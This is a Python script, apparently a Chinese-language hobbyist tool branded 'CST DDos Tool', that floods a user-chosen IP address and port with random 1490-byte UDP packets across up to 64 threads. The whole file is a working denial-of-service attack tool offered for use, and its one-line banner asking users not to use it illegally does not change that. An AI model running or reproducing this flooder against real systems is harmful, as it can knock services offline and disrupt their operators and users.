import sys
import os
import time
import socket
import random
import threading
from datetime import datetime

def send_packets(ip, port, sd, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes_to_send, (ip, port))
            sent += 1
            print(f"[CST-DDOS] [Info] [线程 {thread_id}] 已发送 {sent} 个数据包到 {ip} 端口 {port}")
            time.sleep((1000 - sd) / 2000)
    except Exception as e:
        print(f"[CST-DDOS] [Error] [线程 {thread_id}] 发生错误: {e}")

def main():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    os.system("clear")
    os.system("figlet DDos Attack")
    print(" ")
    print("/-----------------CST DDos Tool-------------------\ ")
    print("|   作者          : Command_stone                   |")
    print("|   作者github    : https://github.com/commandstone |")
    print("|   QQ群 : ******************                       |")
    print("|   版本          : V2.0.0                          |")
    print("|   多线程版                                         |")
    print("\---------------------------------------------------/")
    print(" ")
    print(" -----------------[请勿用于违法用途]----------------- ")
    print(" ")
    ip = input("请输入 IP/域名 : ")
    port = int(input("端口 : "))
    sd = int(input("速度(1~2048)   : "))
    threads_num = int(input("线程数量(1~64): "))

    os.system("clear")

    threads = []
    for i in range(threads_num):
        thread = threading.Thread(target=send_packets, args=(ip, port, sd, i+1))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
